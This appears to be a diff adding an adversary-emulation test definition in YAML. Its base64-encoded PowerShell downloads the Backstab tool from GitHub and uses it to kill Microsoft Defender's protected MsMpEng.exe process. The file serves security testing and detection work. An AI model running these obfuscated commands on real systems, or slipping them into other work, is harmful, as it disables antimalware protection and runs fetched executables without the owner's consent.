@@ -1,0 +1,18 @@
+- id: 4add84ef-c9ab-5c01-9da4-b90190dec246
+  name: Soumaia ART Tests - Kill antimalware protected processes using Backstab
+  description: 'Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
+
+    https://github.com/Yaxser/Backstab (requires elevation)'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABCAGEAYwBrAHMAdABhAGIANgA0AC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAFkAYQB4AHMAZQByAC8AQgBhAGMAawBzAHQAYQBiAC8AcgBlAGwAZQBhAHMAZQBzAC8AZABvAHcAbgBsAG8AYQBkAC8AdgAxAC4AMAAuADEALQBiAGUAdABhAC8AQgBhAGMAawBzAHQAYQBiADYANAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAQgBhAGMAawBzAHQAYQBiADYANAAuAGUAeABlACIACgA=
+          }
+          & "$env:TEMP\ART-ExternalPayloads\Backstab64.exe" -k -n MsMpEng.exe
